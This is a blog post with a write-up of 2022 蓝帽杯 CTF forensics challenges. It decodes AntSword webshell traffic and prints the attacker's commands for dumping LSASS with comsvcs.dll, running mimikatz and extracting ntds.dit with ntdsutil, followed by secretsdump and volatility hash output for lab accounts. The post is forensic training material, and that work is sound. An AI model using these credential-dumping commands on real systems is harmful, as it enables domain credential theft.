<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>蓝帽杯 2022 Writeup | YuGao&#39;s Blog</title><meta name="description" content="YuGao's Blog"><link rel="alternate" href="/rss.xml" title="YuGao's Blog" type="application/rss+xml"><meta name="HandheldFriendly" content="True"><meta name="mobile-web-app-capable" content="yes"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple_touch_icon.png"><script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery-pjax@2.0.1/jquery.pjax.min.js"></script><link href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css" rel="stylesheet"><script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script><script>NProgress.configure({parent:"#loading-bar-wrapper"})</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css"><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 7.3.0"></head><div id="loading-bar-wrapper"></div><script>NProgress.start(),NProgress.inc(.2)</script><body><header class="l_header blur"><div class="wrapper"><div class="nav-main container container--flex"><a class="logo flat-box" href="/">YuGao's Blog</a><div class="menu"><ul class="h-list"><li><a id="home" class="nav flat-box" href="/"><i class="fas fa-home fa-fw"></i>&nbsp; 主页</a></li><li><a id="archives" class="nav flat-box" href="/archives/"><i class="fas fa-archive fa-fw"></i>&nbsp; 归档</a></li><li><a id="friends" class="nav flat-box" href="/friends/"><i class="fas fa-users fa-fw"></i>&nbsp; 友链</a></li><li><a id="about" class="nav flat-box" href="/about/"><i class="fas fa-user fa-fw"></i>&nbsp; 关于</a></li></ul></div><div class="m_search"><form name="searchform" class="form u-search-form"><input type="text" class="input u-search-input" placeholder="搜索"> <span class="icon"><i class="fas fa-search fa-fw"></i></span></form></div><ul class="switcher h-list"><li class="s-search"><a class="fas fa-search fa-fw" href="javascript:void(0)"></a></li><li class="s-menu"><a class="fas fa-bars fa-fw" href="javascript:void(0)"></a></li></ul></div><div class="nav-sub container container--flex"><a class="logo flat-box"></a><ul class="switcher h-list"><li class="s-comment"><a class="fas fa-comments fa-fw" href="javascript:void(0)"></a></li><li class="s-toc"><a class="flat-btn fas fa-list fa-fw" href="javascript:void(0)"></a></li></ul></div></div></header><aside class="menu-phone"><header><nav class="menu"><ul><li><a id="home" class="nav flat-box" href="/"><i class="fas fa-home fa-fw"></i>&nbsp; 主页</a></li><li><a id="archives" class="nav flat-box" href="/archives/"><i class="fas fa-archive fa-fw"></i>&nbsp; 归档</a></li><li><a id="friends" class="nav flat-box" href="/friends/"><i class="fas fa-users fa-fw"></i>&nbsp; 友链</a></li><li><a id="about" class="nav flat-box" href="/about/"><i class="fas fa-user fa-fw"></i>&nbsp; 关于</a></li></ul></nav></header></aside><div class="l_body"><script>NProgress.inc(.4)</script><div class="container clearfix" id="pjax-container"><div class="l_main"><article id="post" class="card-shadow blur post article-type-post" itemscope itemprop="blogPost"><section class="meta"><div class="meta" id="header-meta"><h1 class="title">蓝帽杯 2022 Writeup</h1><time class="metatag time"><i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i> 2022-08-01 星期一</time><div class="metatag cats"><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i> &nbsp;<a class="categories" href="/categories/CTF/">CTF</a>&nbsp;/&nbsp;<a class="categories" href="/categories/CTF/%E8%93%9D%E5%B8%BD%E6%9D%AF/">蓝帽杯</a></div><div class="metatag browse leancloud"><i class="fas fa-eye fa-fw" aria-hidden="true"></i> <span id="/p/533ccbb.html" class="leancloud_visitors" data-flag-title="蓝帽杯 2022 Writeup"><span>被浏览</span> <span class="leancloud-visitors-count"></span> <span>次</span></span></div></div></section><section class="article typo"><div class="article-entry" itemprop="articleBody"><p>7月底划水打了蓝帽杯，然后一直没写 wp 鸽到现在，感觉整个暑假啥也没干，应该写点啥。</p><span id="more"></span><h2 id="Misc">Misc</h2><h3 id="domainhacker">domainhacker</h3><p>本来在准备 hvv，但由于疫情原因不了了之。不过鉴于那段时间的培训，一下子就分辨出是蚁剑的流量。本题的流量是经过 base64 加密并且加 Salt 的，不过可以从代码还原出来。</p><p>在流量包的请求体中能轻松辨别出参数，解码后依次有以下这些有用的指令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;C:\\phpstudy_pro\\WWW&quot;</span>&amp;powershell <span class="literal">-c</span> <span class="string">&quot;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 476 C:\windows\temp\lsass.dmp full&quot;</span>&amp;<span class="built_in">echo</span> efa923ba504&amp;<span class="built_in">cd</span>&amp;<span class="built_in">echo</span> <span class="number">1</span>a4be8815ef8</span><br><span class="line"><span class="comment"># 将内存中 dump 出来</span></span><br><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;c:\\Windows\\Temp&quot;</span>&amp;mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span> &gt; <span class="number">1</span>.txt&amp;<span class="built_in">echo</span> efa923ba504&amp;<span class="built_in">cd</span>&amp;<span class="built_in">echo</span> <span class="number">1</span>a4be8815ef8</span><br><span class="line"><span class="comment"># 用 mimikatz 把内存中的域信息导出到 1.txt</span></span><br><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;c:\\Windows\\Temp&quot;</span>&amp;rar.exe a <span class="literal">-PSecretsPassw0rds</span> <span class="number">1</span>.rar <span class="number">1</span>.txt&amp;<span class="built_in">echo</span> efa923ba504&amp;<span class="built_in">cd</span>&amp;<span class="built_in">echo</span> <span class="number">1</span>a4be8815ef8</span><br><span class="line"><span class="comment"># 进行加密压缩</span></span><br></pre></td></tr></table></figure><p>这样我们就知道压缩包密码是 <code>SecretsPassw0rds</code>，之后还有个下载请求，分离出压缩包，解压得到 <code>1.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : PDC$</span><br><span class="line">Domain            : TEST</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/4/15 22:22:24</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">    msv :	</span><br><span class="line">     [00000003] Primary</span><br><span class="line">     * Username : PDC$</span><br><span class="line">     * Domain   : TEST</span><br><span class="line">     * NTLM     : 416f89c3a5deb1d398a1a1fce93862a7</span><br><span class="line">     * SHA1     : 54896b6f5e60e9be2b46332b13d0e0f110d6518f</span><br><span class="line">    tspkg :	</span><br><span class="line">    wdigest :	</span><br><span class="line">     * Username : PDC$</span><br><span class="line">     * Domain   : TEST</span><br><span class="line">     * Password : (null)</span><br><span class="line">    kerberos :	</span><br><span class="line">     * Username : pdc$</span><br><span class="line">     * Domain   : test.local</span><br><span class="line">     * Password : 15 e0 7e 07 d9 9d 3d 42 45 40 38 ec 97 d6 25 59 c9 e8 05 d9 fa bd 81 f9 2e 05 67 84 e1 a3 a3 ec eb 65 ba 6e b9 60 9b dd 5a 74 4b 2e 07 68 94 fd a1 cb 2e 7b a2 13 07 31 34 c2 1d e8 95 53 43 38 61 91 53 2b c4 b0 3e ea 7a ac 03 60 1f bf e8 dc 00 c5 fe 13 ed 7a ca 88 32 fc d0 c6 ea d2 c7 b4 87 31 82 dd 4c 96 4f 23 80 39 2e 31 b0 cf 67 8e 63 b2 5e f9 77 32 44 05 8e 22 f9 0c 69 32 64 1b b8 2d a0 99 0e b8 0e 2c 10 b6 ff 6d 5f 11 c9 5e 46 eb 62 df 00 7a bd c6 7b 83 db 0f 58 ed ac a3 66 dd c2 ec df 9f 22 b3 34 0d 07 89 ea 3b 2b b1 e1 f9 e2 e5 85 cd a3 78 ae dd e3 98 78 39 8e 4f 49 5a b6 05 4c 6d 1a e6 fa 30 c7 c6 fb 4d dc b4 ca f6 3c 20 fe 70 eb e3 16 82 78 f8 49 8d 15 6a 15 10 ac d8 68 f8 ef ad 0c c2 39 f2 ca 80 ef 96 </span><br><span class="line">    ssp :	KO</span><br><span class="line">    credman :	</span><br></pre></td></tr></table></figure><p>把 NTLM 的值作为 flag 即可：<code>flag&#123;416f89c3a5deb1d398a1a1fce93862a7&#125;</code></p><h3 id="domainhacker2">domainhacker2</h3><p>类似的，同样是蚁剑的流量，不过指令种类更加丰富（有机会来分析一下各类流量）。</p><p>同样提取出有用的指令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;C:\\phpstudy_pro\\WWW&quot;</span>&amp;dsquery computer&amp;<span class="built_in">echo</span> <span class="number">1</span>d3632&amp;<span class="built_in">cd</span>&amp;<span class="built_in">echo</span> <span class="number">78</span>bc462ab</span><br></pre></td></tr></table></figure><p>获取到域中的计算机（CN = Common Name，OU = Organizational Unit，DC = Domain Component）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;CN=PDC,OU=Domain Controllers,DC=test,DC=local&quot;</span><br><span class="line">&quot;CN=EXCHANGE,CN=Computers,DC=test,DC=local&quot;</span><br><span class="line">&quot;CN=SDC,OU=Domain Controllers,DC=test,DC=local&quot;</span><br><span class="line">&quot;CN=testnew,CN=Computers,DC=test,DC=local&quot;</span><br><span class="line">&quot;CN=WIN-PJ6ELFEG09P,CN=Computers,DC=test,DC=local&quot;</span><br><span class="line">&quot;CN=testcomputer,CN=Computers,DC=test,DC=local&quot;</span><br><span class="line">&quot;CN=t,CN=Computers,DC=test,DC=local&quot;</span><br><span class="line">&quot;CN=tt,CN=Computers,DC=test,DC=local&quot;</span><br></pre></td></tr></table></figure><p>获取本机名：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;C:\\phpstudy_pro\\WWW&quot;</span>&amp;hostname&amp;<span class="built_in">echo</span> <span class="number">1</span>d3632&amp;<span class="built_in">cd</span>&amp;<span class="built_in">echo</span> <span class="number">78</span>bc462ab</span><br></pre></td></tr></table></figure><p>得知本机为 PDC，结合之前的域信息得知本机就是域管理员。</p><p>新建了一个 <code>log.txt</code>，并写入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ac i ntds</span><br><span class="line">ifm</span><br><span class="line">create full c:\windows\temp\new</span><br><span class="line">q</span><br><span class="line">q</span><br></pre></td></tr></table></figure><p>与<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration">这篇文章</a>相同的方法（只是把 log.txt 作为流输入了）导出密钥信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;C:\\phpstudy_pro\\WWW&quot;</span>&amp;cmd.exe /c ntdsutil.exe &lt; log.txt &gt;err.txt <span class="number">2</span>&gt;&amp;<span class="number">1</span>&amp;<span class="built_in">echo</span> <span class="number">1</span>d3632&amp;<span class="built_in">cd</span>&amp;<span class="built_in">echo</span> <span class="number">78</span>bc462ab</span><br></pre></td></tr></table></figure><p>导出到 <code>err.txt</code>，并获得回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe: 活动实例设置为“ntds”。</span><br><span class="line">ntdsutil.exe: ifm: 正在创建快照...</span><br><span class="line">成功生成快照集 &#123;f9c1f274-352f-439a-bdaa-7c3dd12b17c9&#125;。</span><br><span class="line">快照 &#123;2c502f9f-0060-4286-a0f3-f1c10becc9db&#125; 已作为 C:\$SNAP_202204161011_VOLUMEC$\ 装载</span><br><span class="line">已装载快照 &#123;2c502f9f-0060-4286-a0f3-f1c10becc9db&#125;。</span><br><span class="line">正在启动碎片整理模式...</span><br><span class="line">     源数据库: C:\$SNAP_202204161011_VOLUMEC$\Windows\NTDS\ntds.dit</span><br><span class="line">     目标数据库: c:\windows\temp\new\Active Directory\ntds.dit</span><br><span class="line"></span><br><span class="line">                  Defragmentation  Status (% complete)</span><br><span class="line"></span><br><span class="line">          0    10   20   30   40   50   60   70   80   90  100</span><br><span class="line">          |----|----|----|----|----|----|----|----|----|----|</span><br><span class="line">          ...................................................</span><br><span class="line"></span><br><span class="line">正在复制注册表文件...</span><br><span class="line">正在复制 c:\windows\temp\new\registry\SYSTEM</span><br><span class="line">正在复制 c:\windows\temp\new\registry\SECURITY</span><br><span class="line">快照 &#123;2c502f9f-0060-4286-a0f3-f1c10becc9db&#125; 已卸载。</span><br><span class="line">在 c:\windows\temp\new 中成功创建 IFM 媒体。</span><br><span class="line">ifm: ntdsutil.exe: 1d3632</span><br></pre></td></tr></table></figure><p>然后和前一题一样使用压缩包打包，密码是 <code>FakePassword123$</code>，不得不说挺有迷惑性的：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;c:\\Windows\\Temp&quot;</span>&amp;rar.exe a <span class="literal">-PFakePassword123</span><span class="variable">$</span> ntds.rar new&amp;<span class="built_in">echo</span> <span class="number">1</span>d3632&amp;<span class="built_in">cd</span>&amp;<span class="built_in">echo</span> <span class="number">78</span>bc462ab</span><br></pre></td></tr></table></figure><p>我们用 impacket 的 secretsdump 脚本导出密钥信息，注意要历史密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -system &quot;domainhacker2_184c16876d41965a695f89232ae5392d\new\registry\SYSTEM&quot; -security &quot;domainhacker2_184c16876d41965a695f89232ae5392d\new\registry\SECURITY&quot; -ntds &quot;domainhacker2_184c16876d41965a695f89232ae5392d\new\Active Directory\ntds.dit&quot; LOCAL -just-dc-ntlm -history</span><br></pre></td></tr></table></figure><p>省略了中间的一些邮箱服务检测账户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xf5a55bb9181f33269276949d2ad680e5</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: 752aa10b88b269bd735d54b802d5c86c</span><br><span class="line">[*] Reading and decrypting hashes from C:\Users\YuGao\Downloads\domainhacker2_184c16876d41965a695f89232ae5392d\new\Active Directory\ntds.dit</span><br><span class="line">test.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:a85016dddda9fe5a980272af8f54f20e:::</span><br><span class="line">test.local\Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:07ab403ab740c1540c378b0f5aaa4087:::</span><br><span class="line">test.local\Administrator_history1:500:aad3b435b51404eeaad3b435b51404ee:34e92e3e4267aa7055a284d9ece2a3ee:::</span><br><span class="line">test.local\Administrator_history2:500:aad3b435b51404eeaad3b435b51404ee:34e92e3e4267aa7055a284d9ece2a3ee:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Admin:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">test:1003:aad3b435b51404eeaad3b435b51404ee:4f95f1c5acfc3b972a1ce2a29ef1f1c5:::</span><br><span class="line">test_history0:1003:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">test_history1:1003:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">PDC$:1004:aad3b435b51404eeaad3b435b51404ee:416f89c3a5deb1d398a1a1fce93862a7:::</span><br><span class="line">PDC$_history0:1004:aad3b435b51404eeaad3b435b51404ee:77c3da77dc1b7a6c257ba59cd4633209:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8d9c46df1a433693842082203898424f:::</span><br><span class="line">EXCHANGE$:1107:aad3b435b51404eeaad3b435b51404ee:8f203498c3054ed0e01efc9d1da10ecd:::</span><br><span class="line">EXCHANGE$_history0:1107:aad3b435b51404eeaad3b435b51404ee:c5c7378155dc9d28ad53d8c1f9e9d915:::</span><br><span class="line">......</span><br><span class="line">test1:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::</span><br><span class="line">test1_history0:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::</span><br><span class="line">test1_history1:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::</span><br><span class="line">test1_history2:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::</span><br><span class="line">test1_history3:1149:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">SDC$:1151:aad3b435b51404eeaad3b435b51404ee:9f40caf799bf0d110fdf08b3bf3eb6c0:::</span><br><span class="line">SDC$_history0:1151:aad3b435b51404eeaad3b435b51404ee:8f3cfaf7a6290b735bcbba5b60d554d4:::</span><br><span class="line">SDC$_history1:1151:aad3b435b51404eeaad3b435b51404ee:7bfe440904b9611776477b85eea398fc:::</span><br><span class="line">testnew$:1152:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::</span><br><span class="line">WIN-PJ6ELFEG09P$:1153:aad3b435b51404eeaad3b435b51404ee:6533cba50e01cace16567ec5691e587f:::</span><br><span class="line">testcomputer$:1154:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::</span><br><span class="line">t$:1155:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::</span><br><span class="line">tt$:1156:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::</span><br><span class="line">WebApp01$:1157:aad3b435b51404eeaad3b435b51404ee:b021fa4e92913d91a6eade97884f508b:::</span><br><span class="line">aaa:1158:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><p>题目要的是 administrator 的上一次 ntlm，别弄错了！</p><p><code>flag&#123;07ab403ab740c1540c378b0f5aaa4087&#125;</code></p><h2 id="电子取证">电子取证</h2><h3 id="手机取证">手机取证</h3><p>感觉是推销盘古石取证的题（雾），用给的工具找就行了，纯粹的签到题。</p><h3 id="计算机取证-1">计算机取证_1</h3><p>用老牌工具 volatility 直接 hashdump 即可，值得注意的是 volatility3 的使用方法和 v2 有很大的不同，网上也没啥教程，摸索了半天。</p><p>下面的是最后弄出来的最简单的办法，中途用的是 volshell，非常折磨。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\vol.py <span class="operator">-f</span> <span class="number">1</span>.dmp windows.hashdump.Hashdump</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Volatility 3 Framework 2.3.0</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">User    rid     lmhash  nthash</span><br><span class="line"></span><br><span class="line">Administrator   500     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">taqi7   1000    aad3b435b51404eeaad3b435b51404ee        7f21caca5685f10d9e849cc84c340528</span><br><span class="line">naizheng        1002    aad3b435b51404eeaad3b435b51404ee        d123b09e13b1a82277c3e3f0ca722060</span><br><span class="line">qinai   1003    aad3b435b51404eeaad3b435b51404ee        1c333843181864a58156f3e9498fe905</span><br></pre></td></tr></table></figure><p>拿 <code>7f21caca5685f10d9e849cc84c340528</code> 去 MD5 网站查询得到是 <code>anxinqi</code>。</p><h3 id="计算机取证-2">计算机取证_2</h3><p>还是用的 volatility：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\vol.py <span class="operator">-f</span> <span class="string">&quot;C:\Users\YuGao\Documents\Tencent Files\2645943187\FileRecv\计算机取证\1.dmp&quot;</span> windows.pslist.PsList &gt; log.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Volatility 3 Framework 2.3.0</span><br><span class="line"></span><br><span class="line">PID    PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output</span><br><span class="line"></span><br><span class="line">4    0	System	0xfa800ccc7890	105	623	N/A	False	2022-04-28 05:38:41.000000 	N/A	Disabled</span><br><span class="line">288    4	smss.exe	0xfa800d9c3610	2	29	N/A	False	2022-04-28 05:38:41.000000 	N/A	Disabled</span><br><span class="line">384    376	csrss.exe	0xfa800e100740	9	486	0	False	2022-04-28 05:38:42.000000 	N/A	Disabled</span><br><span class="line">424    376	wininit.exe	0xfa800e4a3840	3	78	0	False	2022-04-28 05:38:43.000000 	N/A	Disabled</span><br><span class="line">436    416	csrss.exe	0xfa800e4a7b30	10	645	1	False	2022-04-28 05:38:43.000000 	N/A	Disabled</span><br><span class="line">492    416	winlogon.exe	0xfa800e50b060	5	116	1	False	2022-04-28 05:38:43.000000 	N/A	Disabled</span><br><span class="line">532    424	services.exe	0xfa800e523910	6	216	0	False	2022-04-28 05:38:43.000000 	N/A	Disabled</span><br><span class="line">544    424	lsass.exe	0xfa800e52fb30	6	614	0	False	2022-04-28 05:38:43.000000 	N/A	Disabled</span><br><span class="line">552    424	lsm.exe	0xfa800e489060	11	209	0	False	2022-04-28 05:38:43.000000 	N/A	Disabled</span><br><span class="line">...</span><br><span class="line">1020    776	audiodg.exe	0xfa800e6f7060	6	131	0	False	2022-04-28 05:38:44.000000 	N/A	Disabled</span><br><span class="line">420    532	svchost.exe	0xfa800e722060	9	530	0	False	2022-04-28 05:38:44.000000 	N/A	Disabled</span><br><span class="line">956    532	ZhuDongFangYu.	0xfa800e749b30	26	394	0	True	2022-04-28 05:38:44.000000 	N/A	Disabled</span><br><span class="line">1040    532	svchost.exe	0xfa800e75a950	23	636	0	False	2022-04-28 05:38:44.000000 	N/A	Disabled</span><br><span class="line">1300    532	spoolsv.exe	0xfa800e85b570	12	313	0	False	2022-04-28 05:38:45.000000 	N/A	Disabled</span><br><span class="line">1336    532	svchost.exe	0xfa800e88cb30	17	321	0	False	2022-04-28 05:38:45.000000 	N/A	Disabled</span><br><span class="line">1440    532	svchost.exe	0xfa800e907630	4	81	0	True	2022-04-28 05:38:45.000000 	N/A	Disabled</span><br><span class="line">1548    532	vmtoolsd.exe	0xfa800e9c6740	9	276	0	False	2022-04-28 05:38:45.000000 	N/A	Disabled</span><br><span class="line">1960    532	svchost.exe	0xfa800eabd060	5	101	0	False	2022-04-28 05:38:46.000000 	N/A	Disabled</span><br><span class="line">1612    532	dllhost.exe	0xfa800eb07b30	13	186	0	False	2022-04-28 05:38:46.000000 	N/A	Disabled</span><br><span class="line">2068    532	msdtc.exe	0xfa800eb36b30	12	144	0	False	2022-04-28 05:38:48.000000 	N/A	Disabled</span><br><span class="line">2512    532	svchost.exe	0xfa800eabe980	11	146	0	False	2022-04-28 05:40:46.000000 	N/A	Disabled</span><br><span class="line">2584    532	svchost.exe	0xfa800ea79b30	13	335	0	False	2022-04-28 05:40:46.000000 	N/A	Disabled</span><br><span class="line">2648    532	SearchIndexer.	0xfa800eaa8310	11	658	0	False	2022-04-28 05:40:47.000000 	N/A	Disabled</span><br><span class="line">1792    660	WmiPrvSE.exe	0xfa800ea7a0f0	7	114	0	False	2022-04-28 05:42:48.000000 	N/A	Disabled</span><br><span class="line">916    532	taskhost.exe	0xfa800cdf4b30	9	209	1	False	2022-04-28 05:42:55.000000 	N/A	Disabled</span><br><span class="line">972    920	dwm.exe	0xfa800cdfe210	3	70	1	False	2022-04-28 05:42:55.000000 	N/A	Disabled</span><br><span class="line">2044    1716	explorer.exe	0xfa800e585b30	53	1335	1	False	2022-04-28 05:42:55.000000 	N/A	Disabled</span><br><span class="line">2672    2044	vmtoolsd.exe	0xfa800e83eb30	7	209	1	False	2022-04-28 05:42:56.000000 	N/A	Disabled</span><br><span class="line">2664    2044	ldnews.exe	0xfa800e84f780	10	363	1	True	2022-04-28 05:42:56.000000 	N/A	Disabled</span><br><span class="line">2436    956	360Tray.exe	0xfa800ea25580	150	1455	1	True	2022-04-28 05:42:57.000000 	N/A	Disabled</span><br><span class="line">3500    2288	LiveUpdate360.	0xfa800edc8b30	18	305	1	True	2022-04-28 05:43:13.000000 	N/A	Disabled</span><br><span class="line">4012    3784	360TptMon.exe	0xfa800ee90b30	17	415	1	True	2022-04-28 05:43:22.000000 	N/A	Disabled</span><br><span class="line">3316    532	svchost.exe	0xfa800ee6bb30	3	57	0	True	2022-04-28 05:43:23.000000 	N/A	Disabled</span><br><span class="line">3396    2436	SoftMgrLite.ex	0xfa800eb76b30	30	360	1	True	2022-04-28 05:44:13.000000 	N/A	Disabled</span><br><span class="line">3496    2044	TrueCrypt.exe	0xfa800ec4b630	5	268	1	True	2022-04-28 05:46:22.000000 	N/A	Disabled</span><br><span class="line">2964    3496	TrueCrypt Form	0xfa800ea45b30	0	-	1	False	2022-04-28 05:46:35.000000 	2022-04-28 05:47:59.000000 